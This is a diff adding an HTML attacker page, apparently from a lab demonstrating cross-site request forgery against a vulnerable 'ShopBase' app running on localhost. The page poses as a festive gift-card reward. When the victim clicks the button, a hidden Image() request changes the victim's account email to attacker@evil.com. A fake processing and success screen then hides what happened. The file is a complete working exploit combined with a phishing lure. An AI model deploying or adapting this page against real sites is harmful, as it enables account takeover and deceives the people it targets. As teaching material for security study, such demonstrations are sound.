@@ -1,0 +1,105 @@
+<!doctype html>
+<!--
+  Attacker page - served from a DIFFERENT origin (http://localhost:4000) to
+  simulate "evil.com". Item (b): the working exploit.
+
+  The forged request fires the instant the victim clicks "Claim reward".
+  claim() creates an Image() pointing at the vulnerable ShopBase endpoint; the
+  browser sends that GET with the victim's ShopBase session cookie attached
+  automatically, changing the email. The victim sees a believable
+  processing -> success flow and suspects nothing.
+-->
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ShopBase Rewards - Claim your gift card</title>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+    background:#eef0f4;color:#1b2436;display:grid;place-items:center;min-height:100vh;padding:24px}
+  .wrap{width:100%;max-width:460px}
+  .brandbar{background:#0f2a57;color:#fff;border-radius:12px 12px 0 0;padding:14px 22px;
+    display:flex;align-items:center;gap:9px;font-weight:800;letter-spacing:.2px}
+  .brandbar .mark{width:26px;height:26px;border-radius:6px;background:#ff6a2b;display:grid;place-items:center}
+  .brandbar .tag{margin-left:auto;font-size:.72rem;font-weight:700;background:rgba(255,255,255,.15);padding:4px 10px;border-radius:999px}
+  .card{background:#fff;border:1px solid #e3e8f0;border-top:0;border-radius:0 0 12px 12px;padding:28px 26px;text-align:center}
+  h1{font-size:1.35rem;margin:4px 0 6px}
+  p{color:#5c6678;line-height:1.55;font-size:.95rem}
+  .voucher{position:relative;margin:22px 0;background:#0f2a57;color:#fff;border-radius:14px;padding:26px 22px;overflow:hidden}
+  .voucher::before,.voucher::after{content:"";position:absolute;top:50%;width:26px;height:26px;background:#fff;border-radius:50%;transform:translateY(-50%)}
+  .voucher::before{left:-13px}.voucher::after{right:-13px}
+  .voucher .lbl{font-size:.72rem;letter-spacing:3px;text-transform:uppercase;opacity:.8}
+  .voucher .amt{font-size:2.4rem;font-weight:800;margin:6px 0 2px}
+  .voucher .exp{font-size:.76rem;opacity:.75}
+  .code{margin-top:14px;font-family:'Consolas',monospace;letter-spacing:2px;background:rgba(255,255,255,.12);
+    border:1px dashed rgba(255,255,255,.4);border-radius:8px;padding:9px;font-size:1rem}
+  .cta{display:inline-block;width:100%;border:0;border-radius:10px;background:#ff6a2b;color:#fff;
+    font-weight:700;font-size:1.02rem;padding:14px;cursor:pointer;margin-top:6px}
+  .cta:hover{filter:brightness(1.05)}
+  .spinner{margin:6px auto;width:40px;height:40px;border-radius:50%;
+    border:4px solid #edf0f5;border-top-color:#ff6a2b;animation:spin 1s linear infinite}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .check{margin:4px auto 10px;width:62px;height:62px;border-radius:50%;background:#128a4e;
+    display:grid;place-items:center}
+  .fine{margin-top:16px;font-size:.72rem;color:#9aa3b4;line-height:1.5}
+  .hidden{display:none}
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="brandbar">
+      <span class="mark"><svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z"/><path d="M3 6h18M16 10a4 4 0 0 1-8 0"/></svg></span>
+      ShopBase Rewards<span class="tag">Festive Offer</span>
+    </div>
+    <div class="card">
+
+      <!-- STATE 1: offer -->
+      <div id="offer">
+        <h1>You have a reward waiting</h1>
+        <p>As a valued ShopBase member, a gift card has been reserved for your account.</p>
+        <div class="voucher">
+          <div class="lbl">ShopBase Gift Card</div>
+          <div class="amt">&#8377;5,000</div>
+          <div class="exp">Reserved for your account - expires tonight</div>
+        </div>
+        <button class="cta" onclick="claim()">Claim reward</button>
+        <div class="fine">Limited-time festive reward. One claim per registered account. Standard terms apply.</div>
+      </div>
+
+      <!-- STATE 2: processing -->
+      <div id="loading" class="hidden">
+        <div class="spinner"></div>
+        <h1 style="color:#0f2a57">Processing your reward</h1>
+        <p>Adding the gift card to your ShopBase account. This only takes a moment.</p>
+      </div>
+
+      <!-- STATE 3: done -->
+      <div id="done" class="hidden">
+        <div class="check"><svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg></div>
+        <h1 style="color:#128a4e">Reward added</h1>
+        <p>Your <b>&#8377;5,000 gift card</b> has been credited. Use the code below at checkout.</p>
+        <div class="voucher"><div class="lbl">Your code</div><div class="code">SB-5K-9QX4-7T2A</div></div>
+        <div class="fine">Thank you for being a ShopBase member.</div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    function show(id){
+      ['offer','loading','done'].forEach(function(s){
+        document.getElementById(s).classList.toggle('hidden', s !== id);
+      });
+    }
+    function claim(){
+      // ---- THE ATTACK: forged cross-site GET, cookie auto-attached ----
+      new Image().src =
+        'http://localhost:3000/account/update-email?email=attacker@evil.com&_=' + Date.now();
+      // ---- Cover story shown to the victim ----
+      show('loading');
+      setTimeout(function(){ show('done'); }, 1900);
+    }
+  </script>
+</body>
+</html>
